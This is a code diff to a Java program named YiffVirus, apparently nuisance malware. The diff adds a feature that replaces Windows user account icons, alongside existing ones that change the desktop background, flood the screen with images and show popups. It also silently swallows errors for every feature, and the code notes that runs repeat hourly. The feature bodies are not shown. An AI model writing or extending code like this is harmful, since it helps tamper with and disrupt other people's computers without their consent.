@@ -5,6 +5,7 @@ import com.formdev.flatlaf.FlatDarculaLaf;
 import com.google.gson.Gson;
 import me.bannock.virus.features.Feature;
 import me.bannock.virus.features.impl.FeatChangeBackground;
+import me.bannock.virus.features.impl.FeatChangeUserIcons;
 import me.bannock.virus.features.impl.FeatImageFlood;
 import me.bannock.virus.features.impl.FeatPopupImages;
 import me.bannock.virus.images.ImageProviderService;
@@ -43,8 +44,8 @@ public class YiffVirus extends JFrame implements Runnable {
     private final Feature[] features = new Feature[]{
             new FeatChangeBackground(),
             new FeatImageFlood(),
-            new FeatPopupImages()
-            // TODO: Set default user icon - C:\ProgramData\Microsoft\User Account Pictures
+            new FeatPopupImages(),
+            new FeatChangeUserIcons()
             // TODO: Set folder icons
     };
 
@@ -77,8 +78,7 @@ public class YiffVirus extends JFrame implements Runnable {
                 if (HEADLESS_CONFIG_FILE.exists()) {
                     try {
                         yiffVirus.setConfig(new Gson().fromJson(Files.readString(HEADLESS_CONFIG_FILE.toPath()), Config.class));
-                    } catch (Exception ignored) {
-                    }
+                    } catch (Exception ignored) {}
                 }
                 yiffVirus.run();
             }
@@ -108,7 +108,9 @@ public class YiffVirus extends JFrame implements Runnable {
 
         // Loop through and run every feature
         for (Feature feature : features){
-            feature.setConfig(config).run();
+            try{
+                feature.setConfig(config).run();
+            }catch (Exception ignored){}
         }
 
         // Repeated hourly if wanted
@@ -127,7 +129,4 @@ public class YiffVirus extends JFrame implements Runnable {
         this.config = config;
     }
 
-    public ImageProviderService getImageProviderService() {
-        return imageProviderService;
-    }
 }
